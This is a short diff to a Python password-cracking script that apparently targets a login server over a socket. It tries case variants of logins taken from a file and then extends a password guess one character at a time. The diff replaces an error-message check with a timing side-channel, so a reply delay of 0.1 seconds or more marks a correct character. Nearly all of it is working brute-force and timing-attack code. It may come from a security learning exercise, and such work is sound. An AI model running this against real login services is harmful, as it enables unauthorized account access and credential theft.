@@ -3,6 +3,7 @@ import sys
 import itertools
 import json
 import string
+import time
 
 
 # find all the possible combinations of upper and lower case letters for each login provided in file
@@ -53,13 +54,16 @@ while True:
     pass_attempt = next(pswrd)
     to_send = {"login": login, "password": password + pass_attempt}
     the_socket.send(json.dumps(to_send).encode())
+    start = time.perf_counter()
     response = the_socket.recv(1024)
+    end = time.perf_counter()
+    total = end - start # check amount of time elapsed to receive a response from the server
     # when successful print login and password in JSON
     if json.loads(response.decode("utf-8"))["result"] == "Connection success!":
         print(json.dumps(to_send))
         break
     # saves each correct char for the password
-    elif json.loads(response.decode("utf-8"))["result"] == "Exception happened during login":
+    elif total >= 0.1: # if there is a delayed response, add char to current string of passwords until it is correct
         password += pass_attempt
 file.close()
 the_socket.close()
